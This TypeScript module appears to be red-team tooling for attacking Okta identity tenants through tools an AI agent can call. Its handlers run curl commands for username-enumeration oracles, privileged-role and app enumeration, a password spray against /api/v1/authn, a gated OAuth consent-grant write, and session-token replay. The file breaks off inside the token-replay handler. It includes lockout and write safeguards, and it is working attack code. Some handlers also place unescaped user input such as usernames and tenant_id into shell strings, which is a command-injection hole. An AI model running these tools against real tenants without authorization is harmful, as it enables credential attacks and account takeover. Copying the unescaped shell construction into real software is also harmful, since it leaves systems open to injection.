import { executeInKali } from "../utils/docker-exec";

// =============================================================================
// IDENTITY — Okta (Okta Identity Cloud) red-team MCP tool module.
//
// Authorized red-team tooling for testing Okta identity infrastructure that
// customers explicitly authorize (the Okta analog of identity-entra.ts /
// identity-ad.ts). Mirrors those modules exactly:
//   - `identityOktaTools`    : MCP tool definitions (name, description, inputSchema)
//   - `identityOktaHandlers` : Record<string, Function> shelling out via executeInKali
//
// Okta is API/token-driven, so these tools use curl + jq against the Okta API
// (/api/v1/*), the OAuth/OIDC .well-known endpoints, and the org metadata
// endpoints. Auth, where required, is an Okta API token (SSWS) or an OAuth
// access token, supplied per-tool.
//
// CLOUD W1b LESSON (applied at design time): every handler runs a
// `command -v <tool>` preflight (INSTALLED / NOT INSTALLED) and uses `2>&1` (NOT
// `2>/dev/null`) so a packaging gap is never silently mistaken for an auth
// failure, and real tool/network errors surface in the output.
//
// SAFETY (.claude/agents/_preamble.md §15):
//   - LOCKOUT MANDATE: spray_okta reads `lockout_threshold` +
//     `lockout_window_minutes`, sprays AT MOST (threshold - 1) attempts per
//     account per window, 1 password across users per window, jitter,
//     abort-on-first-lockout. If no safe limit can be determined the spray is
//     BLOCKED (no guessed default). Never brute-forces; never locks out accounts.
//   - NON-DESTRUCTIVE DEFAULTS: every write / consent-grant / app-creation op
//     gates behind an explicit `attempt_*: boolean` defaulting to FALSE.
//     Read-only enumeration / proof runs freely.
//
// Every tool takes `tenant_id` (the Okta org URL or org id) so the parent
// scope validator can pin it to the in-scope Okta org (the identity analog of
// cloud's `cloud_account_id` / Entra's `tenant_id`).
// =============================================================================

// Shell-escape a value for safe single-quoted embedding in a bash command.
// Wraps in single quotes and escapes embedded single quotes via '\''.
function sq(value: string): string {
  return `'${String(value).replace(/'/g, `'\\''`)}'`;
}

// Build the standard tool-availability preflight line (cloud W1b lesson).
function preflight(tool: string, versionFlag = "--version"): string {
  return `command -v ${tool} >/dev/null 2>&1 && echo "${tool}: INSTALLED ($(${tool} ${versionFlag} 2>&1 | head -1))" || echo "${tool}: NOT INSTALLED"`;
}

export const identityOktaTools = [
  // ===========================================================================
  // RECON
  // ===========================================================================
  {
    name: "enum_okta_org",
    description:
      "[OKTA RECON — no auth] Unauthenticated Okta org fingerprint: probes the org URL, GET /.well-known/openid-configuration, /.well-known/okta-organization, the authorization-server metadata, and the sign-in widget config to recover org id, supported OAuth flows, auth-server issuers, and pipeline/branding. No auth required.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation (e.g. https://corp.okta.com)",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL to fingerprint (e.g. https://corp.okta.com). Defaults to tenant_id.",
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "enum_okta_users",
    description:
      "[OKTA RECON — username oracle] Validate which usernames/logins exist in the org. With an okta_api_token, queries the Users API (/api/v1/users) for exact-match existence. Without a token, observes /api/v1/authn response differentials (E0000004 vs lockout/MFA states) as an existence oracle. Recon only — no password attempts.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        okta_api_token: {
          type: "string",
          description: "Okta API token (SSWS) for the Users API path (optional — falls back to the authn oracle)",
        },
        usernames: {
          type: "array",
          items: { type: "string" },
          description: "Candidate usernames/logins to test for existence",
        },
      },
      required: ["tenant_id", "usernames"],
    },
  },
  {
    name: "enum_okta_apps",
    description:
      "[OKTA RECON — needs API TOKEN] OAuth app + API service app enumeration with grants/scopes (the consent-abuse surface): lists /api/v1/apps, and per-app /api/v1/apps/{id}/grants and /api/v1/apps/{id}/credentials to surface broad/admin OAuth scopes (okta.users.manage, okta.apps.manage, etc.). Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        okta_api_token: {
          type: "string",
          description: "Okta API token (SSWS) with read access to apps",
        },
      },
      required: ["tenant_id", "okta_api_token"],
    },
  },
  {
    name: "enum_okta_admin_roles",
    description:
      "[OKTA RECON — needs API TOKEN] Privileged role enumeration: lists administrator role assignments (SUPER_ADMIN, ORG_ADMIN, APP_ADMIN, USER_ADMIN, HELP_DESK_ADMIN, etc.) across users and groups via /api/v1/iam/assignees and /api/v1/users/{id}/roles to map who holds tenant-wide control. Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        okta_api_token: {
          type: "string",
          description: "Okta API token (SSWS) with read access to roles",
        },
      },
      required: ["tenant_id", "okta_api_token"],
    },
  },
  {
    name: "enum_okta_policies",
    description:
      "[OKTA RECON — needs API TOKEN] Sign-on / network-zone / MFA policy gap analysis (the conditional-access analog): enumerates /api/v1/policies (OKTA_SIGN_ON, MFA_ENROLL, PASSWORD, ACCESS_POLICY), their rules, and /api/v1/zones to find legacy-auth allowances, missing-MFA factor gaps, and over-broad network zones. Read-only.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        okta_api_token: {
          type: "string",
          description: "Okta API token (SSWS) with read access to policies",
        },
      },
      required: ["tenant_id", "okta_api_token"],
    },
  },

  // ===========================================================================
  // EXPLOITATION
  // ===========================================================================
  {
    name: "spray_okta",
    description:
      "[OKTA EXPLOIT — LOCKOUT-GATED, §15.1] Lockout-aware Okta password spray against /api/v1/authn. THE LOCKOUT MANDATE APPLIES: you MUST pass lockout_threshold and lockout_window_minutes; sprays AT MOST (lockout_threshold - 1) attempts per account per window, one password across all users per window, jitter, abort-on-first-lockout. Defaults to ONE attempt/user/window. If lockout_threshold is omitted the spray is BLOCKED (no guessed default). Never brute-forces, never locks out accounts.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        usernames: {
          type: "array",
          items: { type: "string" },
          description: "Usernames/logins to spray ACROSS (one password per window — never down one account)",
        },
        password: {
          type: "string",
          description: "The single password to try across all users this window",
        },
        lockout_threshold: {
          type: "number",
          description: "MANDATORY — the org PASSWORD-policy lockout threshold (failed attempts before lock). The spray stays at (threshold - 1) max per account per window. No safe default is guessed.",
        },
        lockout_window_minutes: {
          type: "number",
          description: "MANDATORY — the lockout counter window in minutes (from the org password policy). Used to pace windows and prove the safe cadence.",
        },
        attempts_per_user: {
          type: "number",
          description: "Attempts per user per window. Default 1 (SAFE). Hard-capped at lockout_threshold - 1.",
          default: 1,
        },
        jitter_seconds: {
          type: "number",
          description: "Random delay seconds between per-user attempts (default 30)",
          default: 30,
        },
        abort_on_lockout: {
          type: "boolean",
          description: "Halt the entire spray on first observed lockout (E0000069 / LOCKED_OUT) — default true, do not disable",
          default: true,
        },
      },
      required: ["tenant_id", "usernames", "password", "lockout_threshold", "lockout_window_minutes"],
    },
  },
  {
    name: "test_okta_mfa",
    description:
      "[OKTA EXPLOIT — needs API TOKEN or authn factor list — non-destructive] Enumerate enrolled MFA factors per user (/api/v1/users/{id}/factors) and analyze for weak factors (SMS/call/email/security-question), push-fatigue exposure (Okta Verify push without number-challenge), and factor-downgrade paths (a strong factor coexisting with a weak self-service one). Read-only analysis — no factor reset/enroll.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        okta_api_token: {
          type: "string",
          description: "Okta API token (SSWS) with read access to user factors",
        },
        user_id: {
          type: "string",
          description: "Specific Okta user id (or login) to enumerate factors for. Omit to sample across users.",
        },
      },
      required: ["tenant_id", "okta_api_token"],
    },
  },
  {
    name: "abuse_okta_consent",
    description:
      "[OKTA EXPLOIT — needs API TOKEN — gated WRITE] OAuth consent-grant / app abuse. Default (attempt_grant=false) ANALYZES the abuse path only: enumerates existing app grants/scopes and identifies the broadest-scope reachable app. With attempt_grant=true it performs the real write (create an OAuth app / grant a scope via /api/v1/apps/{id}/grants) to prove the consent-abuse path — user-confirm per §15.2 required.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        okta_api_token: {
          type: "string",
          description: "Okta API token (SSWS) with app-management rights",
        },
        app_id: {
          type: "string",
          description: "Target app id to grant a scope to (for the write path)",
        },
        scope_id: {
          type: "string",
          description: "OAuth scope to grant (e.g. okta.users.read, okta.apps.manage)",
        },
        attempt_grant: {
          type: "boolean",
          description: "Actually create the OAuth app grant (WRITE). Default false = analyze the abuse path only.",
          default: false,
        },
      },
      required: ["tenant_id", "okta_api_token"],
    },
  },
  {
    name: "test_okta_token_replay",
    description:
      "[OKTA EXPLOIT — non-destructive] Session / OAuth token replay. Replays a captured Okta session token (sid/idx cookie or one-time sessionToken) and/or an OAuth access token READ-ONLY against /api/v1/users/me and /api/v1/sessions/me to prove the token is still valid, binding-free, and reusable from the tester's context (no IP/device pinning). Read-only — no session revocation or mutation.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        session_token: {
          type: "string",
          description: "A captured Okta session cookie value (sid) or one-time sessionToken to replay",
        },
        access_token: {
          type: "string",
          description: "An OAuth access token (Bearer) to replay against the org API",
        },
      },
      required: ["tenant_id"],
    },
  },
  {
    name: "test_okta_saml",
    description:
      "[OKTA EXPLOIT — non-destructive] SAML/OIDC response weakness analysis: pulls the app's SAML metadata (/api/v1/apps/{id}/sso/saml/metadata) and inspects signing config for golden-SAML-class exposure — XML signature validation gaps, signature-wrapping (XSW) tolerance, weak/missing assertion signing, and IdP signing-key exposure that would let a forged assertion be minted. Analysis only — does not submit a forged assertion.",
    inputSchema: {
      type: "object",
      properties: {
        tenant_id: {
          type: "string",
          description: "Okta org URL or org id for scope validation",
        },
        okta_org_url: {
          type: "string",
          description: "The Okta org base URL (defaults to tenant_id)",
        },
        okta_api_token: {
          type: "string",
          description: "Okta API token (SSWS) — optional, enables per-app SAML metadata retrieval",
        },
        app_id: {
          type: "string",
          description: "SAML app id to analyze (omit to inspect the org-level IdP metadata)",
        },
      },
      required: ["tenant_id"],
    },
  },
];

export const identityOktaHandlers: Record<string, Function> = {
  // ===========================================================================
  // RECON
  // ===========================================================================
  enum_okta_org: async (args: {
    tenant_id: string;
    okta_org_url?: string;
  }) => {
    const { tenant_id, okta_org_url } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");

    const commands: string[] = [
      `echo "=== Okta Org Fingerprint (unauthenticated) ==="`,
      `echo "Org: ${tenant_id}"`,
      `echo "URL: ${orgUrl}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
      `echo "--- OpenID Connect .well-known config (default auth server) ---"`,
      `curl -sS ${sq(`${orgUrl}/.well-known/openid-configuration`)} 2>&1 | jq . 2>&1 | head -c 12000 || echo "OIDC config request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Okta org metadata (.well-known/okta-organization) ---"`,
      `curl -sS ${sq(`${orgUrl}/.well-known/okta-organization`)} 2>&1 | jq . 2>&1 | head -c 6000 || echo "okta-organization request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Authorization server metadata (oauth-authorization-server) ---"`,
      `curl -sS ${sq(`${orgUrl}/oauth2/default/.well-known/oauth-authorization-server`)} 2>&1 | jq . 2>&1 | head -c 8000 || echo "auth-server metadata request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Sign-in widget / config probe (org branding + pipeline) ---"`,
      `curl -sS -D - ${sq(`${orgUrl}/login/login.htm`)} -o /dev/null 2>&1 | head -c 4000 || echo "sign-in widget probe FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Org id / issuer extraction ---"`,
      `curl -sS ${sq(`${orgUrl}/.well-known/openid-configuration`)} 2>&1 | jq -r '.issuer // empty' 2>&1 || echo "Could not extract issuer"`,
      `echo ""`,
      `echo "=== Okta Org Fingerprint Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_okta_users: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    okta_api_token?: string;
    usernames: string[];
  }) => {
    const { tenant_id, okta_org_url, okta_api_token, usernames } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");

    const commands: string[] = [
      `echo "=== Okta User/Login Enumeration ==="`,
      `echo "Org: ${tenant_id}"`,
      `echo "URL: ${orgUrl}"`,
      `echo "Candidates: ${usernames.length}"`,
      `echo "Mode: ${okta_api_token ? "Users API (SSWS token)" : "authn response oracle (no token)"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
    ];

    for (const user of usernames) {
      commands.push(`echo "--- Candidate: ${user} ---"`);
      if (okta_api_token) {
        // Users API exact-match existence (read-only).
        commands.push(
          `curl -sS -H ${sq(`Authorization: SSWS ${okta_api_token}`)} ${sq(`${orgUrl}/api/v1/users/${encodeURIComponent(user)}`)} 2>&1 | jq '{status, profile: {login: .profile.login, email: .profile.email}, errorCode}' 2>&1 || echo "Users API lookup for ${user} FAILED (see stderr above)"`
        );
      } else {
        // authn response oracle: a valid login returns MFA_REQUIRED/SUCCESS/LOCKED_OUT
        // while a non-existent one returns E0000004 (authentication failed) — read-only existence check.
        commands.push(
          `curl -sS -X POST -H "Content-Type: application/json" -d ${sq(JSON.stringify({ username: user, password: "X-maestro-enum-not-a-real-attempt", options: { warnBeforePasswordExpired: false, multiOptionalFactorEnroll: false } }))} ${sq(`${orgUrl}/api/v1/authn`)} 2>&1 | jq '{status, errorCode, errorSummary}' 2>&1 || echo "authn oracle probe for ${user} FAILED (see stderr above)"`
        );
      }
      commands.push(`echo ""`);
    }
    commands.push(
      `echo "NOTE: authn-oracle mode sends ONE non-real password per user purely to read the existence differential (E0000004 = unknown user). It is NOT a spray and stays at 1 attempt/user."`
    );
    commands.push(`echo "=== Okta User Enumeration Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  enum_okta_apps: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    okta_api_token: string;
  }) => {
    const { tenant_id, okta_org_url, okta_api_token } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");
    const authHeader = `-H ${sq(`Authorization: SSWS ${okta_api_token}`)}`;

    const commands: string[] = [
      `echo "=== Okta OAuth App / Grant Enumeration ==="`,
      `echo "Org: ${tenant_id}"`,
      `echo "URL: ${orgUrl}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
      `echo "--- Applications (/api/v1/apps) ---"`,
      `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/apps?limit=200`)} 2>&1 | jq '[.[] | {id, name, label, status, signOnMode}]' 2>&1 | head -c 30000 || echo "apps request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Per-app OAuth scope grants (the consent-abuse surface) ---"`,
      // For each app, list grants (broad/admin scopes are the abuse surface).
      `for APP_ID in $(curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/apps?limit=200`)} 2>&1 | jq -r '.[].id' 2>/dev/null); do echo "App $APP_ID grants:"; curl -sS ${authHeader} ${sq(`${orgUrl}`)}"/api/v1/apps/$APP_ID/grants" 2>&1 | jq '[.[] | {scopeId, issuer, status}]' 2>&1 | head -c 4000 || echo "grants for $APP_ID FAILED"; done 2>&1 | head -c 30000 || echo "per-app grant enumeration FAILED (see stderr above)"`,
      `echo ""`,
      `echo "=== Okta App Enumeration Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_okta_admin_roles: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    okta_api_token: string;
  }) => {
    const { tenant_id, okta_org_url, okta_api_token } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");
    const authHeader = `-H ${sq(`Authorization: SSWS ${okta_api_token}`)}`;

    const commands: string[] = [
      `echo "=== Okta Privileged Role Enumeration ==="`,
      `echo "Org: ${tenant_id}"`,
      `echo "URL: ${orgUrl}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
      `echo "--- Org-wide role assignments (/api/v1/iam/assignees/users) ---"`,
      `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/iam/assignees/users?limit=200`)} 2>&1 | jq . 2>&1 | head -c 20000 || echo "iam assignees request FAILED (see stderr above; older orgs use per-user role listing below)"`,
      `echo ""`,
      `echo "--- Per-user admin roles (SUPER_ADMIN / ORG_ADMIN / APP_ADMIN / USER_ADMIN / HELP_DESK_ADMIN) ---"`,
      `for UID in $(curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/users?limit=200`)} 2>&1 | jq -r '.[].id' 2>/dev/null); do ROLES=$(curl -sS ${authHeader} ${sq(`${orgUrl}`)}"/api/v1/users/$UID/roles" 2>&1 | jq -r '[.[] | .type] | join(",")' 2>/dev/null); if [ -n "$ROLES" ] && [ "$ROLES" != "null" ]; then echo "$UID: $ROLES"; fi; done 2>&1 | head -c 20000 || echo "per-user role enumeration FAILED (see stderr above)"`,
      `echo ""`,
      `echo "=== Okta Role Enumeration Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  enum_okta_policies: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    okta_api_token: string;
  }) => {
    const { tenant_id, okta_org_url, okta_api_token } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");
    const authHeader = `-H ${sq(`Authorization: SSWS ${okta_api_token}`)}`;

    const commands: string[] = [
      `echo "=== Okta Policy Gap Analysis (sign-on / MFA / zones) ==="`,
      `echo "Org: ${tenant_id}"`,
      `echo "URL: ${orgUrl}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
      `echo "--- Sign-on policies (OKTA_SIGN_ON) ---"`,
      `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/policies?type=OKTA_SIGN_ON`)} 2>&1 | jq '[.[] | {id, name, status, conditions}]' 2>&1 | head -c 15000 || echo "OKTA_SIGN_ON policy request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- MFA enrollment policies (MFA_ENROLL) ---"`,
      `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/policies?type=MFA_ENROLL`)} 2>&1 | jq '[.[] | {id, name, status, settings}]' 2>&1 | head -c 15000 || echo "MFA_ENROLL policy request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Password policies (PASSWORD) — lockout threshold/window source ---"`,
      `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/policies?type=PASSWORD`)} 2>&1 | jq '[.[] | {id, name, status, lockout: .settings.password.lockout}]' 2>&1 | head -c 12000 || echo "PASSWORD policy request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "--- Network zones (over-broad zone detection) ---"`,
      `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/zones`)} 2>&1 | jq '[.[] | {id, name, type, status, gateways, proxies}]' 2>&1 | head -c 12000 || echo "zones request FAILED (see stderr above)"`,
      `echo ""`,
      `echo "=== Okta Policy Gap Analysis Complete ==="`,
    ];

    return await executeInKali(commands.join(" && "));
  },

  // ===========================================================================
  // EXPLOITATION
  // ===========================================================================
  spray_okta: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    usernames: string[];
    password: string;
    lockout_threshold: number;
    lockout_window_minutes: number;
    attempts_per_user?: number;
    jitter_seconds?: number;
    abort_on_lockout?: boolean;
  }) => {
    const {
      tenant_id,
      okta_org_url,
      usernames,
      password,
      lockout_threshold,
      lockout_window_minutes,
      attempts_per_user = 1,
      jitter_seconds = 30,
      abort_on_lockout = true,
    } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");

    // ===== LOCKOUT MANDATE (§15.1) — enforced in behavior, not just description =====
    // 1. Read the threshold + window first. If either is absent/invalid, BLOCK (no guessed default).
    if (
      lockout_threshold === undefined ||
      lockout_threshold === null ||
      !Number.isFinite(lockout_threshold) ||
      lockout_threshold <= 0
    ) {
      return JSON.stringify({
        status: "BLOCKED",
        reason: "LOCKOUT_THRESHOLD_REQUIRED",
        tool: "spray_okta",
        target: tenant_id,
        message:
          "Lockout Mandate (§15.1): spray_okta requires a positive lockout_threshold from the org PASSWORD policy. No safe default is guessed. Spray BLOCKED.",
      });
    }
    if (
      lockout_window_minutes === undefined ||
      lockout_window_minutes === null ||
      !Number.isFinite(lockout_window_minutes) ||
      lockout_window_minutes <= 0
    ) {
      return JSON.stringify({
        status: "BLOCKED",
        reason: "LOCKOUT_WINDOW_REQUIRED",
        tool: "spray_okta",
        target: tenant_id,
        message:
          "Lockout Mandate (§15.1): spray_okta requires a positive lockout_window_minutes to pace windows safely. No safe default is guessed. Spray BLOCKED.",
      });
    }

    // 2. Stay strictly below the line: at most (threshold - 1) attempts per account per window.
    const maxSafeAttempts = lockout_threshold - 1;
    if (maxSafeAttempts < 1) {
      return JSON.stringify({
        status: "BLOCKED",
        reason: "LOCKOUT_LEAVES_NO_HEADROOM",
        tool: "spray_okta",
        target: tenant_id,
        lockout_threshold,
        message: `Lockout Mandate (§15.1): lockout_threshold ${lockout_threshold} leaves ${maxSafeAttempts} safe attempt(s) (< 1). Spray BLOCKED.`,
      });
    }

    // Default to ONE attempt; values >1 are explicit opt-in, still capped at (threshold - 1).
    const requestedAttempts = Math.max(1, attempts_per_user);
    const effectiveAttempts = Math.min(requestedAttempts, maxSafeAttempts);

    const commands: string[] = [
      `echo "=== Okta Password Spray (LOCKOUT-AWARE, §15.1) ==="`,
      `echo "Org: ${tenant_id}  URL: ${orgUrl}"`,
      `echo "Users: ${usernames.length}"`,
      `echo "Lockout threshold: ${lockout_threshold}  Window: ${lockout_window_minutes}m  Safe ceiling: ${maxSafeAttempts} (threshold - 1)"`,
      `echo "Attempts/user this window: ${effectiveAttempts} (requested ${requestedAttempts}, 1 = SAFE default)"`,
      `echo "Jitter: ${jitter_seconds}s  Abort-on-lockout: ${abort_on_lockout}"`,
      `echo "Strategy: ONE password across ALL users per window (never down one account)."`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
    ];

    // 3. One password per window, sprayed ACROSS users (never down one account).
    // 4. Abort on first observed lockout.
    // The authn body is built per-user inside a shell loop ($U) so the username is
    // bound safely; the literal "__U__" placeholder is substituted via sed at runtime.
    const userListLiteral = usernames.map((u) => sq(u)).join(" ");
    const safeBody = JSON.stringify({
      username: "__U__",
      password,
      options: { warnBeforePasswordExpired: false, multiOptionalFactorEnroll: false },
    });

    for (let pass = 0; pass < effectiveAttempts; pass++) {
      commands.push(
        `echo "--- Spray pass ${pass + 1}/${effectiveAttempts} (one password across all users, ${jitter_seconds}s jitter) ---"`
      );
      commands.push(
        `for U in ${userListLiteral}; do ` +
          `BODY=$(printf '%s' ${sq(safeBody)} | sed "s/__U__/$U/"); ` +
          `RESP=$(curl -sS -X POST -H "Content-Type: application/json" -d "$BODY" ${sq(`${orgUrl}/api/v1/authn`)} 2>&1); ` +
          `echo "$U -> $(echo "$RESP" | jq -c '{status, errorCode}' 2>/dev/null || echo "$RESP")"; ` +
          (abort_on_lockout
            ? `if echo "$RESP" | grep -qiE 'LOCKED_OUT|E0000069'; then echo "[ABORT] Lockout observed for $U — halting spray (abort_on_lockout=true)."; break; fi; `
            : "") +
          `sleep ${Math.floor(jitter_seconds)}; ` +
          `done 2>&1 || echo "spray pass ${pass + 1} FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
    }
    if (abort_on_lockout) {
      commands.push(`echo "NOTE: abort_on_lockout=true — any LOCKED_OUT/E0000069 above means the spray halted; do NOT re-run within the ${lockout_window_minutes}m window."`);
    }
    commands.push(`echo "=== Okta Password Spray Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  test_okta_mfa: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    okta_api_token: string;
    user_id?: string;
  }) => {
    const { tenant_id, okta_org_url, okta_api_token, user_id } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");
    const authHeader = `-H ${sq(`Authorization: SSWS ${okta_api_token}`)}`;

    const commands: string[] = [
      `echo "=== Okta MFA Factor Enumeration + Weakness Analysis ==="`,
      `echo "Org: ${tenant_id}  URL: ${orgUrl}"`,
      `echo "Scope: ${user_id ? `user ${user_id}` : "sample across users"}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
    ];

    if (user_id) {
      commands.push(`echo "--- Enrolled factors for ${user_id} ---"`);
      commands.push(
        `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/users/${encodeURIComponent(user_id)}/factors`)} 2>&1 | jq '[.[] | {factorType, provider, status}]' 2>&1 | head -c 12000 || echo "factors request FAILED (see stderr above)"`
      );
    } else {
      commands.push(`echo "--- Sampling enrolled factors across users ---"`);
      commands.push(
        `for UID in $(curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/users?limit=50`)} 2>&1 | jq -r '.[].id' 2>/dev/null); do echo "User $UID:"; curl -sS ${authHeader} ${sq(`${orgUrl}`)}"/api/v1/users/$UID/factors" 2>&1 | jq -c '[.[] | {factorType, provider, status}]' 2>&1 | head -c 1500 || echo "factors for $UID FAILED"; done 2>&1 | head -c 25000 || echo "factor sampling FAILED (see stderr above)"`
      );
    }
    commands.push(`echo ""`);
    commands.push(
      `echo "WEAKNESS ANALYSIS: factorType in (sms, call, email, question) = WEAK/phishable. 'push' (OKTA provider) without number-challenge = push-fatigue exposure. A weak self-service factor coexisting with a strong one = factor-downgrade path."`
    );
    commands.push(`echo "=== Okta MFA Analysis Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  abuse_okta_consent: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    okta_api_token: string;
    app_id?: string;
    scope_id?: string;
    attempt_grant?: boolean;
  }) => {
    const { tenant_id, okta_org_url, okta_api_token, app_id, scope_id, attempt_grant = false } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");
    const authHeader = `-H ${sq(`Authorization: SSWS ${okta_api_token}`)}`;

    const commands: string[] = [
      `echo "=== Okta OAuth Consent-Grant / App Abuse ==="`,
      `echo "Org: ${tenant_id}  URL: ${orgUrl}"`,
      `echo "App: ${app_id || "(analyze broadest-scope app)"}  Scope: ${scope_id || "(none)"}  attempt_grant (WRITE): ${attempt_grant}"`,
      `echo ""`,
      `echo "--- Tool availability ---"`,
      preflight("curl"),
      preflight("jq"),
      `echo ""`,
    ];

    if (!attempt_grant) {
      commands.push(`echo "--- ANALYZE (attempt_grant=false): enumerating consent-grant abuse surface ---"`);
      commands.push(
        `curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/apps?limit=200`)} 2>&1 | jq '[.[] | {id, label, signOnMode, status}]' 2>&1 | head -c 15000 || echo "app enumeration FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(`echo "--- Existing grants (broad/admin scopes are the abuse target) ---"`);
      commands.push(
        `for APP_ID in $(curl -sS ${authHeader} ${sq(`${orgUrl}/api/v1/apps?limit=200`)} 2>&1 | jq -r '.[].id' 2>/dev/null); do curl -sS ${authHeader} ${sq(`${orgUrl}`)}"/api/v1/apps/$APP_ID/grants" 2>&1 | jq -r --arg a "$APP_ID" '.[] | "\\($a) -> \\(.scopeId) [\\(.status)]"' 2>/dev/null; done 2>&1 | head -c 15000 || echo "grant analysis FAILED (see stderr above)"`
      );
      commands.push(`echo ""`);
      commands.push(
        `echo "No grant created. To prove the abuse path, set attempt_grant=true with app_id + scope_id (WRITE) AND complete the user-confirm protocol (.claude/agents/_preamble.md §15.2)."`
      );
    } else if (app_id && scope_id) {
      commands.push(`echo "--- WRITE (attempt_grant=true) — user-confirm MUST have run (§15.2) ---"`);
      commands.push(`echo "Granting scope '${scope_id}' to app '${app_id}' via /api/v1/apps/{id}/grants ---"`);
      commands.push(
        `curl -sS -X POST ${authHeader} -H "Content-Type: application/json" -d ${sq(JSON.stringify({ scopeId: scope_id }))} ${sq(`${orgUrl}/api/v1/apps/${encodeURIComponent(app_id)}/grants`)} 2>&1 | jq . 2>&1 | head -c 8000 || echo "grant creation FAILED (see stderr above)"`
      );
    } else {
      commands.push(`echo "attempt_grant=true but app_id and/or scope_id missing — nothing to write."`);
    }
    commands.push(`echo ""`);
    commands.push(`echo "=== Okta Consent-Grant Abuse Complete ==="`);

    return await executeInKali(commands.join(" && "));
  },

  test_okta_token_replay: async (args: {
    tenant_id: string;
    okta_org_url?: string;
    session_token?: string;
    access_token?: string;
  }) => {
    const { tenant_id, okta_org_url, session_token, access_token } = args;
    const orgUrl = (okta_org_url || tenant_id).replace(/\/+$/, "");

    const commands: string[] = [
      `echo "=== Okta Session / OAuth Token Replay (read-only) ==="`,
      `echo "Org: ${tenant_id}  URL: ${orgUrl}"`,
